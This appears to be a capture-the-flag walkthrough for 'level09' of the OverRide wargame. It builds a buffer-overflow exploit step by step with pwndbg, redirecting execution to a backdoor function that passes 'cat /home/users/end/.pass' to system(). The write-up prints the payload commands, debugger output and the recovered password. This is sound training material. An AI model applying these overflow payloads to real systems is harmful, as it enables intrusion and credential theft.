# Walkthrough for Level 09

## Binary Overview

`level09` binary is vulnerable to a buffer overflow in the `handle_msg` function, which allows us to overwrite the
return address and redirect the program's flow to the `secret_backdoor` function. The `secret_backdoor` function
reads from STDIN and passes the input to `system()`, allowing us to execute arbitrary commands.

## The strategy

Redirect the program's flow to `secret_backdoor` function and pass the address of `/bin/sh` as the first argument to
`system()`. From here, we'll pass the command we want to execute, which is `cat /home/users/end/.pass` to read the
password for the last level.

## The Vulnerability

`char storage[140]` is a shared buffer located in the `handle_msg` function's stack frame. Is used to store both the
username and the message. `set_username` and `set_msg` functions are called from `handle_msg`. They get user input, 
username and message respectively, first store them into internal buffers and then copied into `storage` sheared buffer.
However, both functions have problems regarding memory management.

`set_username` writes up to 40 bytes into `storage + 140` when `storage` is only 140 bytes long. This means that
`set_username` can overwrite 40 bytes beyond the `storage` buffer in the range `storage + 140` to `storage + 180`.

`set_msg` has `char buf_msg [1024]`, an internal buffer of 1024 bytes in which user's input is stored. Then, it will be
copied using `strncpy` into `storage`, with the particularity that the `length` passed to `strncpy` is the value stored 
at `storage + 180`. This means that the fortieth username's character (which is located at `storage + 140 + 40` = `storage + 180`),
will be used as the `length` to copy from `buf_msg` to `storage`. Since there, we can overwrite the length used in
`strncpy`, allowing us to copy more than 140 bytes into `storage`, overflowing the buffer and overwriting the return address.

![Level 09 overflow diagram](level09_overflow_diagram.excalidraw.svg)

## Finding the offset to overwrite the handle_msg's return address

Our temporary payload is composed of:
- 41 `0xff` bytes to fill the `length` variable at `storage + 180` with a large value.
- A cyclic pattern to overflow the `storage` buffer and overwrite the return address.

```shell
pwndbg> cyclic 1024
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
pwndbg>  shell python2 -c 'print("\xff" * 41 + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf" )' > exploit
pwndbg> r < exploit
Starting program: /home/kali/override/level09/level09 < exploit
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
...SNIP...
pwndbg> info frame
Stack level 0, frame at 0x7fffffffe050:
 rip = 0x555555400931 in handle_msg; saved rip = 0x61616161616c6261
 called by frame at 0x7fffffffe058
 Arglist at 0x61616161616b6261, args: 
 Locals at 0x61616161616b6261, Previous frame's sp is 0x7fffffffe050
 Saved registers:
  rbp at 0x7fffffffe040, rip at 0x7fffffffe048
```

We managed to overwrite the return address with `0x61616161616c6261` (in little-endian: `\x61\x62\x6c\x61\x61\x61\x61\x61`),
which is `ablaaaaa` in ASCII. `ablaaaaa` is part of our cyclic pattern. Now we need to find the offset in the cyclic
pattern that corresponds to this value.

```shell
pwndbg> cyclic -l ablaaaaa
Finding cyclic pattern of 8 bytes: b'ablaaaaa' (hex: 0x61626c6161616161)
Found at offset 286
```

This means that any value we place after byte 286 will overwrite the return address. We can now craft our exploit to
redirect the program's flow to `secret_backdoor`.

## Finding the address of `secret_backdoor`

After coping the binary to `/tmp/level09` to avoid any permission issues, we load it into `gdb` and set a breakpoint
at `main`. From there, we can use `info function secret_backdoor` to find its address.

```shell
level09@OverRide:~$ gdb /tmp/level09 
...SNIP...
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /tmp/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

Adding the address of `secret_backdoor` (`0x00005555555488c`) to our exploit:

```shel
shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "B" * 286 + "\x8c\x48\x55\x55\x55\x00\x00")' > exploit
```

Since use [pwndbg](https://github.com/pwndbg/pwndbg) in other machine, the address of `secret_backdoor` is different.
Instead of `0x00005555555488c`, we use `0x000055555540088c`, so we modify our exploit temporarily to:

```shell
shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "B" * 286 + "\x8c\x08\x40\x55\x55\x55\x00\x00")' > exploit
```

Executing the exploit:

```shell
pwndbg> run < exploit
...SNIP...
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e01df4 in do_system (line=0x7fffffffdfc8 'B' <repeats 136 times>) at ../sysdeps/posix/system.c:148
...SNIP...
─────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────
...SNIP...
 RDI  0x7fffffffdc24 ◂— 0x4242424242424242 ('BBBBBBBB')
 ...SNIP...
 ────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7e01df4 do_system+356
   1   0x5555554008be secret_backdoor+50
   2              0x0 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We achieve redirect programs flow to `secret_backdoor` function. However, the program still crashes because `secret_backdoor` 
calls `system()`, but its first argument (in the `RDI` register) contains `0x4242424242424242`, which is `BBBBBBBB` in ASCII.
So `system("BBBBBBBB")` is called, which causes a segmentation fault. Since `BBBBBBBB` is of our exploit, we subtitute it
with `/bin/sh` to execute a shell. But first, we need to find the offset where we can place `/bin/sh` in our exploit since
originally we use 286 `B` characters to fill the buffer before the return address.

## Finding Offsets to where to place `/bin/sh`'s address

To find the offset where we can place the address of `/bin/sh`, we can use a cyclic pattern again. We substitute the 286
`B` characters in our exploit with a cyclic pattern and run the program again.

```shell
pwndbg> cyclic 286
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaa
pwndbg> run < exploit
...SNIP...
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
...SNIP...
─────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────
 ...SNIP...
 RDI  0x7fffffffdc24 ◂— 0x616a626161616161 ('aaaaabja')
 ...SNIP...
```

We see that `RDI` now contains `0x616a626161616161`, which is `aaaaabja` in ASCII. We can use `cyclic -l` to find
the offset of this value in the cyclic pattern.

```shell
pwndbg> cyclic -l aaaaabja
Finding cyclic pattern of 8 bytes: b'aaaaabja' (hex: 0x6161616161626a61)
Found at offset 266
```

This means that we can place `/bin/sh` at offset 266 in our exploit. We modify our exploit to include `/bin/sh` at
this offset. We modify the amount of `B` characters accordingly to maintain the correct length before the return address.

// TODO delete this line until...
```shell
pwndbg> shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "A" * 266 + "/bin/sh;" + "B" * ( 286 - 266 - 8)  + "\x8c\x08\x40\x55\x55\x55")' > exploit
pwndbg> run < ./exploit
...SINP...
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
...SINP...
──────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7e01df4 <do_system+356>    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7fffffffdc68] not aligned to 16 bytes>
...SINP...
```

We found a segfault due to a problem with alignment. `moveaps` instruction requires the memory address to be aligned to
16 bytes and 0x5540088d is not aligned. So we adjust the target addres by one byte to fix the alignment issue passing
from `\x8c` to `\x8d`.
// ... here

We return to our original machine where the address of `secret_backdoor` is `0x00005555555488c` and modify our exploit
and test it:

```shell
level09@OverRide:~$ python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "A" * 266 + "/bin/sh;" + "B" * ( 286 - 266 - 8)  + "\x8c\x48\x55\x55\x55\x55")' > /tmp/exploit
level09@OverRide:~$ cat /tmp/exploit  | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh: Permission denied
sh: 1: BBBBBBBBBBBBBBBBBBBB: not found
Segmentation fault (core dumped)
```

A shell is executed, but we see an error because the command passed to `/bin/sh` is `AAAAAAAAAA.../bin/sh`, which is not
found. Instead of the 266 "A" characters, we use a cyclic pattern again to find the exact offset where we can place our
command: `cat /home/users/end/.pass;`

```shell
pwndbg> cyclic 266
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabia
```

Executing the exploit with the cyclic pattern:

```shell
(gdb) shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabia" + "/bin/sh;" + "B" * ( 286 - 266 - 8)  + "\x8c\x48\x55\x55\x55\x55")' > /tmp/exploit
(gdb) run < /tmp/exploit
...SNIP...
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
sh: 1: aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabia/bin/sh: not found
sh: 1: BBBBBBBBBBBBBBBBBBBB: not found

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

`/bin/sh` trys to execute `aauaaaaa...`, which is the value at offset 158 in the cyclic pattern. We find the offset with:

```shell
pwndbg> cyclic -l aauaaaaa
Finding cyclic pattern of 8 bytes: b'aauaaaaa' (hex: 0x6161756161616161)
Found at offset 158
```

We substitute the 266 "A" characters with 158 "A" characters to place our command `cat /home/users/end/.pass;` at the
correct offset. We must also adjust the number of "B" characters accordingly, which is `266 - 158 - len(command)`.
We add a semicolon at the end of the command to terminate it properly since the use of a null character or a newline
will result in truncation of the string.

```shell
(gdb) shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "A" * 158 + "cat /home/users/end/.pass;" + 
"B" * (266 - 158 - 26) + "/bin/sh;" + "C" * ( 286 - 266 - 8)  + "\x8c\x48\x55\x55\x55\x55")' > /tmp/exploit
```

## Executing the final exploit

```shell
level09@OverRide:~$ cat /tmp/exploit | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```